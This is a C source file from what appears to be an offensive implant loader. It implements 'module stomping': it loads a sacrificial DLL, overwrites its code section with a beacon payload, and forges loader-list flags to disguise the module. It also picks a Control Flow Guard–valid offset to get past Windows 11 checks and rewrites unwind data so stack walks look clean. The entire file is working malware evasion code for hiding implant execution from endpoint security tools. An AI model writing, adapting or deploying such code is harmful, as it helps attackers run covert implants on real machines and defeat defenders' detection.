#include <Common.h>
#include <Loader.h>

/* ========= [ Module Stomping ] =========
 *
 * Loads a sacrificial DLL via LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES),
 * stomps the beacon into its .text section so execution happens from
 * image-backed memory (IMG type, not PRV).
 *
 * Additionally patches the LDR entry to look like a normally-loaded DLL
 * and stomps valid .pdata/.xdata for clean stack walks. */

#if NAX_STOMP_MODE == NAX_STOMP_MODULE

/* ========= [ LDR entry fixup ] ========= */

#define LDRP_IMAGE_DLL               0x00000004
#define LDRP_LOAD_NOTIFICATIONS_SENT 0x00000008
#define LDRP_PROCESS_STATIC_IMPORT   0x00000020
#define LDRP_ENTRY_PROCESSED         0x00004000

FUNC VOID NaxPatchLdr( PVOID DllBase ) {
    PPEB_LDR_DATA Ldr = NtCurrentPeb()->Ldr;
    PLIST_ENTRY   Head = &Ldr->InLoadOrderModuleList;
    PLIST_ENTRY   Cur  = Head->Flink;

    PIMAGE_NT_HEADERS Nt = NaxPeHeaders( DllBase );
    if ( !Nt )
        return;

    while ( Cur != Head ) {
        PLDR_DATA_TABLE_ENTRY Entry = (PLDR_DATA_TABLE_ENTRY)Cur;
        if ( Entry->DllBase == DllBase ) {
            Entry->EntryPoint = C_PTR( U_PTR( DllBase ) + Nt->OptionalHeader.AddressOfEntryPoint );
            Entry->Flags     |= LDRP_IMAGE_DLL | LDRP_LOAD_NOTIFICATIONS_SENT |
                                LDRP_PROCESS_STATIC_IMPORT | LDRP_ENTRY_PROCESSED;
            return;
        }
        Cur = Cur->Flink;
    }
}

/* ========= [ GFIDS scan — find first CFG-valid offset in .text ] =========
 *
 * Win11 24H2 refuses SetProcessValidCallTargets for offsets not present
 * in the image's Guard Function IDs table.  Placing the beacon at a
 * GFIDS-listed RVA lets the kernel accept the whitelist request. */

#define LCDIR_GFIDS_TABLE_OFF   0x80  /* IMAGE_LOAD_CONFIG_DIRECTORY64.GuardCFFunctionTable  (VA)  */
#define LCDIR_GFIDS_COUNT_OFF   0x88  /* IMAGE_LOAD_CONFIG_DIRECTORY64.GuardCFFunctionCount        */
#define LCDIR_GUARD_FLAGS_OFF   0x90  /* IMAGE_LOAD_CONFIG_DIRECTORY64.GuardFlags                  */
#define LCDIR_MIN_SIZE          0x94  /* minimum Size to contain the guard fields                  */

FUNC ULONG NaxFindGfidsEntry( PVOID DllBase, PIMAGE_NT_HEADERS Nt, ULONG TextRva, ULONG TextSize ) {
    PIMAGE_DATA_DIRECTORY LcDir = &Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
    if ( !LcDir->VirtualAddress )
        return 0;

    PUCHAR LcBase = A_PTR( U_PTR( DllBase ) + LcDir->VirtualAddress );
    ULONG  LcSize = C_DEF32( LcBase );
    if ( LcSize < LCDIR_MIN_SIZE )
        return 0;

    PVOID GfidsTable = C_DEF( C_PTR( U_PTR( LcBase ) + LCDIR_GFIDS_TABLE_OFF ) );
    ULONG GfidsCount = C_DEF32( C_PTR( U_PTR( LcBase ) + LCDIR_GFIDS_COUNT_OFF ) );
    ULONG GuardFlags = C_DEF32( C_PTR( U_PTR( LcBase ) + LCDIR_GUARD_FLAGS_OFF ) );
    ULONG Stride     = 4 + ( ( GuardFlags >> 28 ) & 0xF );

    if ( !GfidsTable || !GfidsCount )
        return 0;

    for ( ULONG i = 0; i < GfidsCount; i++ ) {
        ULONG Rva = C_DEF32( C_PTR( U_PTR( GfidsTable ) + i * Stride ) );
        if ( Rva >= TextRva && Rva < TextRva + TextSize )
            return Rva - TextRva;
    }

    return 0;
}

/* ========= [ stomp beacon into DLL .text ] ========= */

FUNC PVOID NaxModuleStomp(
    _In_ PVOID   HdrPtr,
    _In_ PVOID   BeaconSrc,
    _In_ ULONG   BeaconSize,
    _In_ PVOID   PdataSrc,
    _In_ ULONG   PdataSize,
    _In_ PVOID   XdataSrc,
    _In_ ULONG   XdataSize,
    _In_ ULONG   OrigTextRva,
    _In_ PWCHAR  DllName ) {
    STARDUST_INSTANCE

    PVOID  DllBase    = { 0 };
    SIZE_T ProtSize   = { 0 };
    ULONG  OldProt    = { 0 };

    /* ========= [ load sacrificial DLL ] ========= */
    DllBase = (PVOID)API( LoadLibraryExW )( DllName, NULL, DONT_RESOLVE_DLL_REFERENCES );
    if ( !DllBase )
        return NULL;

    NaxPatchLdr( DllBase );
    Instance()->StompDllBase = DllBase;

    PIMAGE_NT_HEADERS Nt = NaxPeHeaders( DllBase );
    if ( !Nt )
        return NULL;

    /* ========= [ find .text section (code, execute) ] ========= */
    PIMAGE_SECTION_HEADER TextSec = NaxFindSection( Nt, IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE );
    if ( !TextSec )
        return NULL;

    ULONG DllTextRva = TextSec->VirtualAddress;
    PVOID TextBase   = C_PTR( U_PTR( DllBase ) + DllTextRva );

    /* ========= [ align entry to a GFIDS-valid offset ] ========= */
    ULONG GfidsSkip = NaxFindGfidsEntry( DllBase, Nt, DllTextRva, TextSec->SizeOfRawData );

    if ( TextSec->SizeOfRawData < BeaconSize + GfidsSkip )
        return NULL;

    PVOID EntryBase = C_PTR( U_PTR( TextBase ) + GfidsSkip );

    /* ========= [ save clean .text before stomping ] ========= */
    PVOID CleanTextBuf = API( RtlAllocateHeap )( NtCurrentPeb()->ProcessHeap, 0, TextSec->SizeOfRawData );

    /* ========= [ stomp beacon into .text ] ========= */
    ProtSize = TextSec->SizeOfRawData;
    if ( !API( VirtualProtect )( TextBase, ProtSize, PAGE_READWRITE, &OldProt ) )
        return NULL;

    if ( CleanTextBuf )
        MmCopy( CleanTextBuf, TextBase, TextSec->SizeOfRawData );

    MmCopy( EntryBase, BeaconSrc, BeaconSize );

    /* ========= [ write stomp context tag after beacon code ] ========= */
    if ( CleanTextBuf && TextSec->SizeOfRawData >= GfidsSkip + BeaconSize + 4 + sizeof( PVOID ) + sizeof( ULONG ) ) {
        PBYTE pTag = (PBYTE)EntryBase + BeaconSize;
        ULONG magic = NAX_STOMP_CTX_MAGIC;
        ULONG cleanSize = TextSec->SizeOfRawData;
        MmCopy( pTag,                              &magic,        sizeof( ULONG ) );
        MmCopy( pTag + sizeof( ULONG ),            &CleanTextBuf, sizeof( PVOID ) );
        MmCopy( pTag + sizeof( ULONG ) + sizeof( PVOID ), &cleanSize, sizeof( ULONG ) );
    }

    ProtSize = TextSec->SizeOfRawData;
    if ( !API( VirtualProtect )( TextBase, ProtSize, PAGE_EXECUTE_READ, &OldProt ) )
        return NULL;

    /* ========= [ stomp .pdata with unwind data ] ========= */
    if ( PdataSize > 0 && XdataSize > 0 ) {
        PIMAGE_SECTION_HEADER PdataSec = NaxFindSectionByDir( Nt, IMAGE_DIRECTORY_ENTRY_EXCEPTION );
        if ( PdataSec && PdataSec->SizeOfRawData >= ( PdataSize + XdataSize ) ) {

            PVOID PdataBase = C_PTR( U_PTR( DllBase ) + PdataSec->VirtualAddress );
            ULONG PdataRva  = PdataSec->VirtualAddress;

            ProtSize = PdataSec->SizeOfRawData;
            if ( API( VirtualProtect )( PdataBase, ProtSize, PAGE_READWRITE, &OldProt ) ) {

                MmCopy( PdataBase, PdataSrc, PdataSize );
                MmCopy( C_PTR( U_PTR( PdataBase ) + PdataSize ), XdataSrc, XdataSize );

                ULONG XdataRva   = PdataRva + PdataSize;
                ULONG EntryCount = PdataSize / sizeof( RUNTIME_FUNCTION );
                PRUNTIME_FUNCTION Entries = (PRUNTIME_FUNCTION)PdataBase;

                for ( ULONG i = 0; i < EntryCount; i++ ) {
                    Entries[i].BeginAddress += DllTextRva + GfidsSkip;
                    Entries[i].EndAddress   += DllTextRva + GfidsSkip;
                    Entries[i].UnwindData   += XdataRva;
                }

                PVOID  HdrBase   = DllBase;
                SIZE_T HdrSize   = LDR_PAGE_SIZE;
                ULONG  HdrOldPrt = 0;
                if ( API( VirtualProtect )( HdrBase, HdrSize, PAGE_READWRITE, &HdrOldPrt ) ) {
                    Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress = PdataRva;
                    Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size = PdataSize;
                    API( VirtualProtect )( HdrBase, HdrSize, HdrOldPrt, &HdrOldPrt );
                }

                ProtSize = PdataSec->SizeOfRawData;
                API( VirtualProtect )( PdataBase, ProtSize, OldProt, &OldProt );
            }
        }
    }

    return EntryBase;
}

#endif /* NAX_STOMP_MODULE */
